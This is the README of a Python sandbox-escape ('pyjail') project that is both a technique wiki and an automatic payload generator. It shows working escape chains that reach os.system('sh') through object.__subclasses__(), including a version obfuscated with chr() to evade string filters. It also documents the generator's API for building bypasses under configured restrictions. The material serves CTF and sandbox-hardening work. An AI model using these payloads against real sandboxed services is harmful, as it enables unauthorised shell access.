# Pyjailbreaker
Python sandboxes, also known as pyjails in the CTF community, are pieces of code or libraries that runs arbitrary Python code with restricted access to certain resources based on rules and heuristics, commonly used to provide limited scripting functionality to unprivileged users.
With the nature of Python being exceedingly dynamic, there are countless ways to perform any desired functionality - with some potentially unaccounted for by the sandbox authors.

To better defend against this, a centralized knowledge base for all known techniques that is easy to test against was envisioned - and thus Pyjailbreaker was born.

Pyjailbreaker aims to be:
 - a comprehensive, human-readable wiki for Python sandbox escape techniques
 - a payload generator toolchain that automatically utilizes the components listed in said wiki

## Contributing
The most important piece of the repo is the [gadgets](jailbreak/gadgets) submodule! This repo ceases to be useful if not enough gadgets have been documented, both as a wiki and as a payload generator.

**If you know of any way to perform a given functionality in Python that is yet to be documented, no matter if it seems useful or not, please format it into a gadget according to the [specifications](jailbreak/gadgets/README.md) and open a PR!** As long as they conform to the specifications, is novel to the repo, and performs the intended functionality, we will accept it.

Please feel free to open PRs for other aspects of the repo too, including suggestions to enhance the specifications - but a discussion will usually have to be made first before they are merged to preserve the stability and readability of the repo.

## Structure
### Background
Most pyjail payloads can be split into the following components: parts performing a specific functionality that are chained together to perform a final functionality (**gadgets**), and transformations run on the gadgets to make them conform to the jail (**converters**).

For example, a payload to get a shell might require the following components: 

> list classes loaded -> get function with namespace that has `sys` in it -> get `sys` -> get `os` -> run `os.system`.

A common example is the `os._wrap_close` chain, widely adapted for many different jails due to its flexibility:
```py
[cls for cls in object.__subclasses__() if 'os._wrap_close' in str(cls)][0].__init__.__globals__['sys'].modules['os'].system('sh')
```
Which can be broken down into the following snippets of code, aka **gadgets**, to fit the components listed above:
```py
list_classes = object.__subclasses__()
get_func_with_sys = [cls for cls in list_classes if 'os._wrap_close' in str(cls)][0]
get_sys = get_func_with_sys.__init__.__globals__['sys']
get_os = get_sys.modules['os']
get_os.system('sh')
```

A chain, like the one above, can also be **converted** to avoid certain restrictions. For example, if the jail explicitly bans the use of literal strings / quotation marks, we could convert the above chain into this instead:
```py
[cls for cls in object.__subclasses__() if chr(111) + chr(115) + chr(46) + chr(95) + chr(119) + chr(114) + chr(97) + chr(112) + chr(95) + chr(99) + chr(108) + chr(111) + chr(115) + chr(101) in str(cls)][0].__init__.__globals__[chr(115) + chr(121) + chr(115)].modules[chr(111) + chr(115)].system(chr(115) + chr(104))
```
Which is a simple rewrite of the strings to use `chr` on each of the character's ascii value in the strings. Just like `chr` is a new requirement in the example, converters may require gadgets to perform a functionality - as long as those gadgets also do not violate the restrictions imposed by the jail.

By breaking down pyjail payloads into these components, we can document every payload as manageable, single-purpose chunks - with enough documented payloads, the chunks could be mix-and-matched to form new payloads that could bypass a different set of restrictions than the original payloads could.

Note, there are times where a converter can accomplish the same thing as a gadget. Take, for example, extracting dictionary keys using a function, this should be written as a converter as the key has to be specified/templated into the function, despite achieving a similar goal as many gadgets.




### Repository layout
The repository structure can be described with the following components:
 - jailbreak
   - converters
   - gadgets
   - utils

All gadgets will be documented in the [gadgets](jailbreak/gadgets) submodule. Each type of gadgets is in a separate file, and each type has multiple gadgets to choose from - the README details the layout and format the gadgets are expected to be in.

Similarly, all converters will be documented in the [converters](jailbreak/converters) submodule - see the README there for more information. 

The [utils](jailbreak/utils) submodule is there for useful miscellaneous utilities for writing pyjail payloads or for investigating the repo.

In the future, there might be a proper web-based wiki generated from the submodules listed above for easier access and searching - for now the main intended method for looking up the components is via navigating on GitHub.

## Toolchain
The structure above is not only designed for human readability, but also for automatic payload generation: given a set of constraints, it is possible to perform a search on the dependency graphs of the gadgets in order to generate a chain that performs the intended functionality.

This is provided by importing `jailbreak` as a Python module, which will perform the necessary dependency resolution and transformations needed to satisfy the restrictions configured, given that there are gadgets and converters in the repo that satisfies it.

### Usage

The `jailbreak` module can be imported if it is on the Python path, provided that `pip install -r requirements.txt` has been run.

Converters are used automatically in the exploit chain generator as needed, but one can manually import the converters using `from jailbreak.converters.<subdirs> import <converter full name>`, similar to accessing raw gadgets.

Importing a gadget using `from jailbreak import <gadget function name>` will trigger the searcher to perform a traversal with the configured restrictions.

One can configure the restrictions by calling the following function:

```py
import jailbreak
import ast, pickle

jailbreak.config(
    ast=[ast.CALL, ...],                    # a list of ast nodes to be banned
    char='ABCDEF...',                       # a string of all characters to be banned
    substr=['abc', 'def', ...]              # a list of all substrings to be banned
    platforms=["windows", "mac", "linux"],  # a list of platforms that the gadget should support
    versions=[10, 11, 12],                  # a list of versions that the gadget should support
    provided=["<gadget name>", ...],        # list of gadgets (gadget file names) that is already provided, including any names of builtins already provided.
    banned=["<gadget full name>", ...],     # list of full gadget names (gadget function names) that should not be used for any reason
    inline=False                            # boolean for whether the returned gadget chain should be inlined or not (default: false)
)

#returns a string object representing the code generated, or throws an error with the closest string object (closest == least restriction violations)
#params (can be empty) are for the last gadget in the gadget chain (aka the one requested by the user), and are python code in string form for flexibility
#NOTE: all params passed are unverified since it is direct user given code and is deemed usable out of the box
chain = jailbreak.<gadget function name>(<param1>, ...)  
```

The restrictions only adds up at the moment - all of the criteria has to be met for the gadget to be deemed usable.

The `inline=True` configuration is intended for direct use as a payload or for further transformations - the generated code is not intended to be human readable. For investigating gadget chains and their interactions, `inline=False` should be used, which preserves the functions and their dependency hierachy.

Outside of the exploit chain generator, if a specific gadget is required either for manual chain creation, inspection, or testing, `from jailbreak.gadgets.<subdirs> import <gadget full name>` could be used instead.

A user is also able to provide their own gadgets through providing their own python function that conforms to the gadget spec via `jailbreak.register_user_gadget(<gadget function object>, <gadget type (aka the directory names in gadgets/, e.g. "python")>)`.

### Model specification

Aside from the aforementioned submodules in the [Repository layout](README.md#repository-layout) section, there is also one submodule specifically made for payload generation.
The [models](jailbreak/models.py) submodule is a file that stores all the code specific to gadget types within their own classes - the traverser utilizes this to determine how to generate the payload and how violations are handled.

The models have the following function interfaces:

> Common (available on both gadget and converter interfaces):
>  - add_dependency - tracks the dependency, and performs necessary modifications to the raw payload of the gadget to include the dependency
>  - _make_dummy - writes raw dummy data to the current specification to specify it's a dummy
>  - `__repr__` - prints the gadget specification as a string, could be used to hardcode / manually modify a gadget chain
> 
> Gadgets:
>  - `__call__` - calling the gadget instance itself will generate a full payload chain with all the dependencies applied
>  - extract - **copies** and extracts the raw payload for converters to run on
>  - apply_converters - tracks the converters to be applied, and applies the converted payload as the new raw payload of the gadget 
> 
> Converters:
>  - convert - applies the converter to the raw payload extracted from the gadget 

The above models are open to end users for manually creating or editing gadget chains, but end users should not need to modify this submodule.
See [example.py](example.py) for example end user usages of the models.

### Example
To generate a similar chain to the one in the [Background](README.md#background) section, one can simply do:
```py
import jailbreak
jailbreak.config(inline=True)   #inlining for saving space in README
print(jailbreak.get_shell("'sh'"))
```
Which will return the following:
```py
get_shell__os_system_cmd = 'sh'
type = [].__class__.__class__
bytes = type((i for i in []).gi_code.co_code)
type = [].__class__.__class__
str = type(bytes().decode())
object = ().__class__.__base__
list_classes = object.__subclasses__()
sys = [c for c in list_classes if 'wrap_close' in str(c)][0].__init__.__globals__['sys']
os = sys.modules['os']
os.system(get_shell__os_system_cmd)
get_shell__os_system_0 = None
get_shell__os_system_0

```
Note that this payload is more complicated than the one given in the [Background](README.md#background) section - it assumes that builtins like `str` is not available in scope by default. But the same components exist in both payloads - and most importantly both gets us a shell at the end.

More advanced usage can be seen in [example.py](example.py).